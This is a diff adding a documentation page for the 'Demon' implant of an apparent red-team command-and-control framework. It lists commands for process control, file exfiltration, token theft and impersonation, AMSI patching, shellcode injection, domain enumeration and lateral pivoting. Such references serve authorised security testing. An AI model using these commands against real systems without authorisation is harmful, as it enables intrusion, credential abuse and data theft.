@@ -1,0 +1,861 @@
+---
+title: Demon Commands
+description: Complete reference for all Demon agent commands
+---
+
+## Command Overview
+
+Demon implements a comprehensive command set organized by functionality. All commands are dispatched through a central command dispatcher and executed based on the command ID.
+
+<Tip>
+  Type `help` in the Demon interact window to see all available commands. Use `help [command]` for detailed information about a specific command.
+</Tip>
+
+## Session Management
+
+### checkin
+
+Request a full checkin from the Demon agent.
+
+```bash
+checkin
+```
+
+**Output includes:**
+
+<Accordion title="Demon Metadata">
+  - Magic values for verification
+  - First and last call timestamps
+  - AES encryption key and IV
+  - Current sleep delay and jitter
+  - Request ID tracking
+</Accordion>
+
+<Accordion title="Host Information">
+  - Computer hostname
+  - Current username and domain
+  - Internal IP addresses
+  - Network adapter information
+</Accordion>
+
+<Accordion title="Process Information">
+  - Process name and path
+  - Process architecture (x86/x64)
+  - Process ID (PID)
+  - Parent Process ID (PPID)
+  - Elevated/Integrity level
+</Accordion>
+
+<Accordion title="Operating System">
+  - Windows version
+  - Build number
+  - OS architecture
+</Accordion>
+
+### sleep
+
+Modify the agent's sleep interval and jitter.
+
+```bash
+sleep [seconds] [jitter_percent]
+```
+
+**Examples:**
+```bash
+sleep 5        # Sleep 5 seconds with existing jitter
+sleep 10 20    # Sleep 10 seconds with 20% jitter
+sleep 0        # Interactive mode (no sleep)
+```
+
+**Behavior:**
+- With jitter, actual sleep time varies: `sleep ± (sleep * jitter / 100)`
+- Sleep of 0 enables interactive mode for real-time operations
+- Sleep obfuscation only occurs when sleep > 0 and no jobs running
+
+<Note>
+  Working hours and kill date restrictions still apply even with modified sleep values.
+</Note>
+
+### exit
+
+Terminate the Demon agent.
+
+```bash
+exit
+```
+
+<Warning>
+  This command causes the agent to terminate immediately. There is no recovery once executed.
+</Warning>
+
+**Cleanup actions:**
+- Closes all handles
+- Frees allocated memory
+- Terminates all job threads
+- Exits process cleanly
+
+## Process Management
+
+### proc list
+
+Enumerate running processes on the target system.
+
+```bash
+proc list
+```
+
+**Output columns:**
+- Process Name
+- PID (Process ID)
+- PPID (Parent Process ID)
+- Architecture (x86/x64)
+- Username (if accessible)
+- Session ID
+
+**Implementation**: Uses `CreateToolhelp32Snapshot` and `Process32FirstW/Process32NextW`
+
+### proc kill
+
+Terminate a process by PID.
+
+```bash
+proc kill [pid]
+```
+
+**Example:**
+```bash
+proc kill 1234
+```
+
+**Method**: Opens process with `PROCESS_TERMINATE` access and calls `NtTerminateProcess` (via syscall if configured).
+
+### proc create
+
+Spawn a new process in suspended or running state.
+
+```bash
+proc create [state] [path] [args]
+```
+
+**States:**
+- `suspended` - Process created in suspended state
+- `normal` - Process starts immediately
+
+**Examples:**
+```bash
+proc create normal C:\Windows\System32\cmd.exe /c whoami
+proc create suspended C:\Windows\System32\notepad.exe
+```
+
+**Use cases:**
+- Suspended: For process injection targets
+- Normal: Execute commands and capture output
+
+### proc module
+
+List loaded modules in a target process.
+
+```bash
+proc module [pid]
+```
+
+**Output:**
+- Module name
+- Base address
+- Module size
+- Full path
+
+**Use case**: Identify loaded DLLs for injection or hijacking opportunities
+
+### proc grep
+
+Search for processes by name.
+
+```bash
+proc grep [process_name]
+```
+
+**Example:**
+```bash
+proc grep chrome
+```
+
+**Output**: All processes matching the search term with full details
+
+### proc memory
+
+Query memory regions in a target process.
+
+```bash
+proc memory [pid] [protection]
+```
+
+**Protection values:**
+- `PAGE_EXECUTE_READ` (0x20)
+- `PAGE_EXECUTE_READWRITE` (0x40)
+- `PAGE_READWRITE` (0x04)
+
+**Example:**
+```bash
+proc memory 1234 0x40  # Find RWX regions
+```
+
+**Output**: Base address, size, and protection of matching memory regions
+
+## File System Operations
+
+### fs dir
+
+List directory contents.
+
+```bash
+fs dir [path]
+```
+
+**Example:**
+```bash
+fs dir C:\Users\Public
+```
+
+**Output:**
+- File/Directory name
+- Size
+- Last modified time
+- Attributes (Hidden, System, Archive, etc.)
+
+### fs cd
+
+Change current working directory.
+
+```bash
+fs cd [path]
+```
+
+**Example:**
+```bash
+fs cd C:\Windows\Temp
+```
+
+### fs pwd
+
+Print current working directory.
+
+```bash
+fs pwd
+```
+
+### fs download
+
+Download a file from the target to the teamserver.
+
+```bash
+fs download [remote_path]
+```
+
+**Features:**
+- Chunked transfer (configurable chunk size)
+- Progress tracking
+- Automatic resumption on failure
+
+**Example:**
+```bash
+fs download C:\Users\Admin\Documents\secrets.txt
+```
+
+<Note>
+  Large files are automatically split into chunks. Check download progress with the `transfer` command.
+</Note>
+
+### fs upload
+
+Upload a file from the teamserver to the target.
+
+```bash
+fs upload [local_path] [remote_path]
+```
+
+**Example:**
+```bash
+fs upload /tmp/tool.exe C:\Windows\Temp\tool.exe
+```
+
+### fs cat
+
+Read and display file contents.
+
+```bash
+fs cat [path]
+```
+
+**Example:**
+```bash
+fs cat C:\Windows\System32\drivers\etc\hosts
+```
+
+<Warning>
+  Large files will be truncated in output. Use `fs download` for large files.
+</Warning>
+
+### fs remove
+
+Delete a file.
+
+```bash
+fs remove [path]
+```
+
+**Example:**
+```bash
+fs remove C:\Windows\Temp\artifact.exe
+```
+
+### fs mkdir
+
+Create a directory.
+
+```bash
+fs mkdir [path]
+```
+
+### fs copy
+
+Copy a file or directory.
+
+```bash
+fs copy [source] [destination]
+```
+
+### fs move
+
+Move or rename a file.
+
+```bash
+fs move [source] [destination]
+```
+
+## Token Management
+
+### token getuid
+
+Display current user context.
+
+```bash
+token getuid
+```
+
+**Output:**
+- Username
+- Domain
+- SID
+- Integrity level
+- Token type
+
+### token list
+
+List all tokens in the token vault.
+
+```bash
+token list
+```
+
+**Output for each token:**
+- Token ID (for impersonation)
+- Username
+- Domain
+- Token type (Primary/Impersonation)
+- Session ID
+
+### token find-tokens
+
+Scan the system for accessible tokens.
+
+```bash
+token find-tokens
+```
+
+**Process:**
+1. Enumerate all running processes
+2. Attempt to open process token
+3. Query token information
+4. Display accessible tokens
+
+**Use case**: Identify privilege escalation opportunities
+
+### token steal
+
+Steal a token from a process and add to vault.
+
+```bash
+token steal [pid] [handle_optional]
+```
+
+**Examples:**
+```bash
+token steal 1234              # Steal process token
+token steal 1234 0x100        # Steal specific handle
+```
+
+**Process:**
+1. Open target process
+2. Open process token or duplicate specified handle
+3. Duplicate token with `SecurityIdentification` and `SecurityImpersonation`
+4. Store in token vault
+5. Return token ID
+
+### token impersonate
+
+Apply a token from the vault to the current thread.
+
+```bash
+token impersonate [id]
+```
+
+**Example:**
+```bash
+token impersonate 3  # Use token ID from 'token list'
+```
+
+**Effect**: All subsequent operations execute under the impersonated user context
+
+<Note>
+  Impersonation affects the current thread. Use `token revert` to return to the original token.
+</Note>
+
+### token revert
+
+Revert to the default process token.
+
+```bash
+token revert
+```
+
+**Implementation**: Calls `RevertToSelf()` to remove thread impersonation
+
+### token remove
+
+Remove a token from the vault.
+
+```bash
+token remove [id]
+```
+
+### token clear
+
+Remove all tokens from the vault.
+
+```bash
+token clear
+```
+
+### token make
+
+Create a token from credentials.
+
+```bash
+token make [domain] [username] [password]
+```
+
+**Example:**
+```bash
+token make CORP john.doe Password123!
+```
+
+**Methods:**
+- `LogonUserW` with `LOGON32_LOGON_NETWORK` (Type 3)
+- Token added to vault automatically
+
+### token privs-get
+
+Attempt to enable all privileges on current token.
+
+```bash
+token privs-get
+```
+
+**Common privileges enabled:**
+- SeDebugPrivilege
+- SeImpersonatePrivilege  
+- SeLoadDriverPrivilege
+- SeTcbPrivilege
+- SeBackupPrivilege
+- SeRestorePrivilege
+
+### token privs-list
+
+List all privileges and their states.
+
+```bash
+token privs-list
+```
+
+**Output:**
+- Privilege name
+- State (Enabled/Disabled)
+- Attributes
+
+## Code Execution
+
+### inline-execute
+
+Execute a Beacon Object File (BOF) in-memory.
+
+```bash
+inline-execute [path_to_bof] [args]
+```
+
+**Example:**
+```bash
+inline-execute /root/bofs/whoami.o
+```
+
+**Features:**
+- COFF parsing and linking
+- Beacon API compatibility
+- Output capture
+- Optional VEH crash protection
+- Thread-based execution (if configured)
+
+<Accordion title="Execution Modes">
+  **Inline Mode** (`CoffeeThreaded: false`)
+  - Executes in current thread
+  - Fastest performance
+  - No job management
+  - Crash will terminate agent
+  
+  **Threaded Mode** (`CoffeeThreaded: true`)
+  - Executes in separate thread
+  - Manageable via job commands
+  - Isolated from main agent
+  - VEH can catch crashes
+</Accordion>
+
+### dotnet inline-execute
+
+Execute a .NET assembly in-memory.
+
+```bash
+dotnet inline-execute [path_to_assembly] [args]
+```
+
+**Example:**
+```bash
+dotnet inline-execute /root/Seatbelt.exe -group=all
+```
+
+**Process:**
+1. Initialize CLR (if not already loaded)
+2. Patch AMSI in `amsi.dll`
+3. Create AppDomain
+4. Load assembly from memory
+5. Invoke entry point with arguments
+6. Capture console output
+
+<Warning>
+  **OPSEC**: Loading the CLR is irreversible and increases process footprint. The CLR remains loaded for the lifetime of the process.
+</Warning>
+
+### dotnet list-versions
+
+List installed .NET Framework versions.
+
+```bash
+dotnet list-versions
+```
+
+**Output**: All installed .NET versions detected in the registry
+
+### shellcode inject
+
+Inject shellcode into a remote process.
+
+```bash
+shellcode inject [arch] [pid] [path_to_shellcode]
+```
+
+**Example:**
+```bash
+shellcode inject x64 1234 /tmp/payload.bin
+```
+
+See [Injection Techniques](/demon/injection) for detailed documentation.
+
+### shellcode spawn
+
+Spawn a sacrificial process and inject shellcode (fork & run).
+
+```bash
+shellcode spawn [arch] [path_to_shellcode]
+```
+
+**Example:**
+```bash
+shellcode spawn x64 /tmp/payload.bin
+```
+
+**Process:**
+1. Spawn configured process in suspended state
+2. Allocate memory in target
+3. Write shellcode
+4. Create remote thread
+5. Resume process
+
+## Network Commands
+
+### net domain
+
+Query domain information.
+
+```bash
+net domain
+```
+
+**Output:**
+- Domain name
+- Domain controller
+- Forest information
+
+### net dclist
+
+Enumerate domain controllers.
+
+```bash
+net dclist [domain]
+```
+
+### net logons
+
+Enumerate logged-on users.
+
+```bash
+net logons [computer]
+```
+
+**API**: `NetWkstaUserEnum`
+
+### net sessions
+
+Enumerate active sessions on a computer.
+
+```bash
+net sessions [computer]
+```
+
+**API**: `NetSessionEnum`
+
+### net localgroup
+
+Enumerate local groups.
+
+```bash
+net localgroup [computer]
+```
+
+**API**: `NetLocalGroupEnum`
+
+### net group
+
+Enumerate domain groups.
+
+```bash
+net group [domain]
+```
+
+### net user
+
+Enumerate users.
+
+```bash
+net user [domain]
+```
+
+### net share
+
+Enumerate shares on a computer.
+
+```bash
+net share [computer]
+```
+
+**API**: `NetShareEnum`
+
+## Job Management
+
+### job list
+
+List all running jobs.
+
+```bash
+job list
+```
+
+**Output:**
+- Job ID
+- Job type (BOF, Download, etc.)
+- State (Running, Suspended)
+- Thread ID
+
+### job suspend
+
+Suspend a running job.
+
+```bash
+job suspend [id]
+```
+
+**Example:**
+```bash
+job suspend 1
+```
+
+**Implementation**: Calls `NtSuspendThread` on the job's thread
+
+### job resume
+
+Resume a suspended job.
+
+```bash
+job resume [id]
+```
+
+**Implementation**: Calls `NtResumeThread`
+
+### job kill
+
+Terminate and remove a job.
+
+```bash
+job kill [id]
+```
+
+**Process:**
+1. Suspend thread
+2. Terminate thread
+3. Free allocated resources
+4. Remove from job list
+
+<Note>
+  Sleep obfuscation is disabled while jobs are running. Kill or suspend jobs to enable sleep obfuscation.
+</Note>
+
+## Transfer Management
+
+### transfer list
+
+List active file transfers.
+
+```bash
+transfer list
+```
+
+**Output:**
+- Transfer ID
+- Filename
+- Size
+- Progress
+- State
+
+### transfer stop
+
+Pause a file transfer.
+
+```bash
+transfer stop [id]
+```
+
+### transfer resume
+
+Resume a paused transfer.
+
+```bash
+transfer resume [id]
+```
+
+### transfer remove
+
+Cancel and remove a transfer.
+
+```bash
+transfer remove [id]
+```
+
+## Miscellaneous Commands
+
+### screenshot
+
+Capture a screenshot of the desktop.
+
+```bash
+screenshot
+```
+
+**Process:**
+1. Get desktop device context
+2. Create compatible DC
+3. BitBlt to copy screen
+4. Convert to BMP format
+5. Send to teamserver
+
+**Requirements**: GUI session (does not work in services or non-interactive sessions)
+
+### config
+
+View or modify agent configuration.
+
+```bash
+config                                      # Show all settings
+config sleep [seconds] [jitter]             # Modify sleep
+config injection technique [value]          # Set injection technique
+config injection spawn64 [path]             # Set x64 spawn process
+config injection spawn32 [path]             # Set x86 spawn process  
+config memory alloc [value]                 # Set allocation method
+config memory execute [value]               # Set execution method
+config killdate [YYYY-MM-DD HH:MM:SS]      # Set kill date
+config workinghours [HH:MM-HH:MM]          # Set working hours
+```
+
+**Values:**
+- `injection technique`: 1 (Win32), 2 (Syscall), 3 (APC)
+- `memory alloc/execute`: 1 (Win32), 2 (Syscall)
+
+### pivot
+
+Manage SMB pivot connections.
+
+```bash
+pivot list                          # List pivots
+pivot smb-connect [hostname] [pipe] # Connect to SMB pivot
+pivot smb-disconnect [id]           # Disconnect pivot
+```
+
+**Use case**: Create lateral movement paths through compromised hosts
+
+### kerberos
+
+Kerberos ticket operations.
+
+```bash
+kerberos list           # List cached tickets
+kerberos tgt [options]  # Request TGT
+kerberos tgs [options]  # Request TGS
+```
+
+<Note>
+  Kerberos functionality requires appropriate privileges and network access to domain controllers.
+</Note>
+
+## Next Steps
+
+<CardGroup cols={2}>
+  <Card title="Sleep Obfuscation" icon="moon" href="/demon/sleep-obfuscation">
+    Configure sleep techniques for evasion
+  </Card>
+  <Card title="Injection Methods" icon="syringe" href="/demon/injection">
+    Process injection techniques and OPSEC
+  </Card>
+  <Card title="Features Guide" icon="star" href="/demon/features">
+    Explore all Demon capabilities
+  </Card>
+  <Card title="Generate Payloads" icon="hammer" href="/demon/generation">
+    Create configured Demon agents
+  </Card>
+</CardGroup>
